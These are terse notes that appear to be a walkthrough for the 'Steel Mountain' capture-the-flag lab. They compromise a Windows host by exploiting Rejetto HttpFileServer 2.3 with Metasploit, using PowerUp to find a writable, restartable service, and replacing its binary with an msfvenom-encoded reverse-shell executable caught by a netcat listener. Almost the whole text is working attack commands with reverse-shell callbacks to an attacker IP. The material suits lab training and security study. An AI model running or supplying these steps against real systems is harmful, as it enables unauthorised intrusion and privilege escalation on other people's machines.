### Steel Mountain - with Metasploit ###

nmap Target_IP -sV -Pn
** Target port: 8080
** Vulnerable service: HttpFileServer httpd 2.3
searchsploit -w HttpFileServer

msfconsole
search rejetto
set rhosts 10.10.217.123
set rport 8080
set lhost 10.9.189.41
set payload windows/meterpreter/reverse_tcp 
options
run

cd ../../../../../../../
cd Desktop\\

Search on internet and download: github powersploit powerup
upload PowerUp.ps1

load powershell
powershell_shell
. ./PowerUp.ps1  ---To save PowerUp.ps1 in memory
Invoke-AllChecks ---Check for "CanRestart" option to be True and Directory to the application to be writable.

*** Creating payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.189.41 LPORT=3325 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe

nc -lvnp LPORT

upload ASCService.exe

shell
sc stop AdvancedSystemCareService9
exit

cp ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

shell
sc start AdvancedSystemCareService9





